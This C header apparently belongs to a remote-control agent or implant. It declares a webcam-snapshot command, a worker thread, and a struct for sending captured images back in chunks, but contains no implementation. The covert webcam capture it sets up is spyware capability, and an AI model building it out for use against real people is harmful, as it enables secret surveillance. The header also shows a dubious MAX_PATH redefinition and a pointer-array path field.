#pragma once
#ifndef WEBCAMSHOT_H
#define WEBCAMSHOT_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_WEBCAMSHOT
#define MAX_PATH 0x2000

typedef struct _WEBCAMSHOT_DOWNLOAD {
    unsigned char* webcamshot_data;
    DWORD webcamshot_size;
    CHAR fileUuid[37];          // File UUID (36 + 1 for null terminator)
    PCHAR filepath[MAX_PATH];   // Path to the file
    DWORD totalChunks;          // Total number of chunks
    UINT32 currentChunk;        // Current chunk number
    LARGE_INTEGER fileSize;     // Size of the file
} WEBCAMSHOT_DOWNLOAD, *PWEBCAMSHOT_DOWNLOAD;


VOID Webcamshot(_In_ PCHAR taskUuid, _In_ PPARSER arguments);

DWORD WINAPI WebcamshotThread(_In_ LPVOID lpTaskParamter);

#endif //INCLUDE_CMD_WEBCAMSHOT

#endif  //WEBCAMSHOT_H